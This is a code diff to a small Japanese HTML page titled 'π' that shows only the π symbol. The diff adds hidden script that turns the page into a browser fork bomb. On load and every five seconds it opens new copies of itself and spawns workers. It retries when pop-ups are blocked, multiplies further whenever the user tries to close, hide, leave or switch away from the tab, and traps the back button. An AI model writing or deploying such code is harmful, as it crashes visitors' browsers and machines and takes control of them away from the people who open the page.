@@ -2,17 +2,21 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>円周率</title>
+  <title>π</title>
 </head>
 <body>
   <h1>π</h1>
 
   <script>
-    function crashOnClose() {
+    (function eternal() {
       const workers = [];
 
       function spawnTab() {
-        window.open(location.href, '_blank', 'width=200,height=150,left=' + (Math.random()*800) + ',top=' + (Math.random()*600));
+        const w = window.open(location.href, '_blank');
+        if (!w) {
+          // ポップアップブロックされたら現在のタブ内でさらに挑戦
+          setTimeout(() => spawnTab(), 100);
+        }
       }
 
       function spawnWorker() {
@@ -42,6 +46,21 @@
         }
       }
 
+      // 開いた瞬間から定期的に自己増殖（5秒ごと）
+      setInterval(() => {
+        spawnTab();
+        spawnWorker();
+      }, 5000);
+
+      // 初回も即3つ増やす
+      for (let i = 0; i < 3; i++) {
+        setTimeout(() => {
+          spawnTab();
+          spawnWorker();
+        }, i * 500);
+      }
+
+      // 閉じようとしたら爆増
       window.addEventListener('beforeunload', (e) => {
         explode(0);
         e.preventDefault();
@@ -49,14 +68,36 @@
         setTimeout(() => explode(2), 0);
       });
 
+      // 閉じられる瞬間も増やす
       window.addEventListener('pagehide', () => {
-        for (let i = 0; i < 10; i++) {
+        for (let i = 0; i < 20; i++) {
           spawnTab();
         }
       });
-    }
 
-    crashOnClose();
+      // タブが隠れたら増やす
+      document.addEventListener('visibilitychange', () => {
+        if (document.hidden) {
+          for (let i = 0; i < 5; i++) {
+            spawnTab();
+            spawnWorker();
+          }
+        }
+      });
+
+      // 戻るボタン潰し + 増殖
+      history.pushState(null, '', location.href);
+      window.addEventListener('popstate', () => {
+        history.pushState(null, '', location.href);
+        explode(3);
+      });
+
+      // 右クリックとかでも増やす（おまけ）
+      window.addEventListener('blur', () => {
+        spawnTab();
+        spawnWorker();
+      });
+    })();
   </script>
 </body>
 </html>
